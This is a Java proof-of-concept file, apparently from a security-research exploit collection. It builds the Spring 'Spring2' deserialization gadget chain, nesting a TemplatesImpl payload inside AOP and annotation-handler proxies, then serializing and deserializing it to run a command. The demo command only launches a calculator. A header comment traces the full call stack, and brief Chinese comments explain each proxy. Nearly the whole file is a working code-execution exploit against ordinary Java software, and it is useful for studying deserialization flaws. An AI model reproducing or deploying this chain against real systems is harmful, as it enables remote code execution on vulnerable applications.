package com.javasec.pocs.spring;

import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;

/**
 * spring2 4.14
 * invoke:155, JdkDynamicAopProxy (org.springframework.aop.framework)
 * newTransformer:-1, $Proxy0 (com.sun.proxy)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeMethod:202, ReflectionUtils (org.springframework.util)
 * invokeMethod:187, ReflectionUtils (org.springframework.util)
 * readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider (org.springframework.core)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * main:35, spring2 (com.javasec.pocs.spring)
 */
public class spring2 {
    public static void main(String[] args) throws Exception{
        Templates tmpl = SerializeUtils.getTemplate("calc");
        HashMap<String, Object> map = new HashMap<>();
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(tmpl);
        //代理1 typeTemplateProxy->newTransform->AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse); target->template method->newtransfomer
        InvocationHandler jdaHandler = (InvocationHandler) SerializeUtils.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy",advisedSupport);
        Type typeTemplateProxy = SerializeUtils.createProxy(jdaHandler, Type.class, Templates.class);
        HashMap<String, Object> map2 = new HashMap<>();
        map2.put("getType", typeTemplateProxy);
        //代理2 getType->typeTemplateProxy
        InvocationHandler newInvocationHandler = (InvocationHandler) SerializeUtils.newInstance("sun.reflect.annotation.AnnotationInvocationHandler", Target.class, map2);
        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        Object typeProviderProxy = SerializeUtils.createProxy(newInvocationHandler, typeProviderClass);
        //入口点 ReflectionUtils.invokeMethod->getType
        Object payload = SerializeUtils.newInstance("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider", typeProviderProxy, Object.class.getMethod("toString"), 0);
        SerializeUtils.setFieldValue(payload,"methodName","newTransformer");
        SerializeUtils.base64deserial(SerializeUtils.base64serial(payload));
    }
}
